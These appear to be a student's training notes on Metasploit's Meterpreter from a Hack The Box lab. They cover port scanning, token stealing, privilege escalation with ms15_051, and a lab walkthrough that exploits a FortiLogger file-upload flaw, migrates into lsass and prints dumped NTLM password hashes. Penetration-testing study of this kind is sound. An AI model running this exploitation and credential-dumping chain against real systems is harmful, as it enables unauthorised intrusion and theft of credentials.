# Meterpreter

The Meterpreter Payload uses DLL injection to ensure the connection to the victim host is stable and difficult to detect using simple checks.

Meterpreter resides entirely in the memory of the remote host and leaves no traces on the hard drive.

MSF - Scanning Target
db_nmap -sV -p- -T5 -A 10.10.10.15
hosts
services

search iis_webdav_upload_asp
set RHOST
set LHOST
run

## Steal Token

getuid
ps

 1836  592   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe

steal_token 1836
getuid
Server username: NT AUTHORITY\NETWORK SERVICE

## Sessions

bg

OR

background

search local_exploit_suggester

use post/multi/recon/local_exploit_suggester 

set SESSION 1

run

## Privilege Escalation

use exploit/windows/local/ms15_051_client_copy_images

show options

set session 1

set LHOST tun0

run

meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM


### Hashes Dump

hashdump
lsa_dump_sam
lsa_dump_secrets

## LAB

nmap -sV 10.129.11.98

PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5000/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

use auxiliary/scanner/upnp/ssdp_msearch
set RHOSTS 10.129.11.98
RHOSTS => 10.129.11.98
run
Sending UPnP SSDP probes to 10.129.11.98->10.129.11.98 (1 hosts)
[*] No SSDP endpoints found.

--> Failed

use exploit/windows/http/fortilogger_arbitrary_fileupload
set RHOSTS 10.129.11.98
set LHOST tun0

run

(Meterpreter 1)(C:\Windows\system32) > whoami
[-] Unknown command: whoami
(Meterpreter 1)(C:\Windows\system32) > shell
Process 7032 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system


(Meterpreter 1)(C:\Windows\system32) > getuid
Server username: NT AUTHORITY\SYSTEM

ps
 632   472   lsass.exe    x64   0        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\lsass.exe
 migrate 632
[*] Migrating from 6288 to 632...
[*] Migration completed successfully.
(Meterpreter 1)(C:\Windows\system32) > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bdaffbfe64f1fc646a3353be1c2c3c99:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb-student:1002:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077aee1958e7f78070:::
